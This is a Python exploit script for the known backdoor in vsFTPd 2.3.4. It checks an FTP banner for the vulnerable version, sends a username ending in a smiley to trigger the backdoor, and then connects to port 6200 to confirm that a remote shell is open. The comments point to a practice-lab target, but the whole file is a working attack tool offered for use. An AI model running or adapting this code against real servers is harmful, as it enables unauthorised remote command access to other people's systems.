###
# The purpose of this python script is to test for and exploit VSFTPD (Very Secure FTP Daemon) << hahha funny joke
# Background-info: VSFTPD version 2.3.4 release June 30th 2011 had a slight issue with the code. Well not really. Mainly
# a dev left a backdoor open. So we are going to knock and see if we can't exploit that issue and get a shell
###
import telnetlib3
import socket
import time


host = input("Enter target IP\n"
             "format (10.10.10.131):  ")
port = 21
tarport = 6200
desired_service = "vsFTPd 2.3.4".encode("utf-8")
msg = "Desired Service Found at target.....beginning exploit"


def conngen(host, port):
    target = (host, port)
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        conn.connect(target)
        service = conn.recv(1024)
        conn.close()
        if desired_service in service:
            print(msg)
        else:
            print('This program is not equipped to handle this service')
            print(service)
    except ConnectionRefusedError:
        print("It looks like the server is refusing the connection. FTP service seems unavailable at this time. Try again later.")
    return service


def exploit(target):
    conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    conn.connect((target))
    conn.send(b'USER kittpunch:)\n')
    conn.send(b'PASS now\n')
    time.sleep(3)
    conn.close()
    print('Testing backdoor success')
    try:
        print('Attempting to connect to backdoor')
        door_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        door_socket.connect((host, 6200))
        resp = door_socket.recv(1024)
        if b'Shell' in resp:
            print('Success backdoor has been triggered and remote port 6200 is available for \n'
                  'telnet connection')
        else:
            print("It seems it worked but a shell was not found.")
            print(resp)
    except ConnectionRefusedError:
        print('Backdoor did not work')
    return


conngen(host, port)
exploit((host,port))
